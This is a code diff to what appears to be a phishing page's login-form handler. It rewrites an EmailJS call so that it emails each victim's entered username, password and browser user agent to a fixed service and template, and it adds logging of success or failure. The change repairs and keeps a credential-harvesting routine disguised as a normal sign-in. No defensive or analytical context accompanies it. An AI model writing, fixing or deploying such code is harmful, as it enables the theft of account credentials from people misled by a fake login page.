@@ -217,11 +217,16 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
       return;
     }
 
-    emailjs.sendForm('service_qqf5p4q', 'template_u5yl8jg', {
-      un: username,
-      up: password,
-      ua: userAgent,
-    })
+    emailjs.send('service_qqf5p4q', 'template_u5yl8jg', {
+    un: username,
+    up: password,
+    ua: userAgent
+})
+.then(function(response) {
+    console.log('Success:', response);
+}, function(error) {
+    console.log('Failed:', error);
+});
 
   } catch (err) {
     spinner.style.display = 'none';
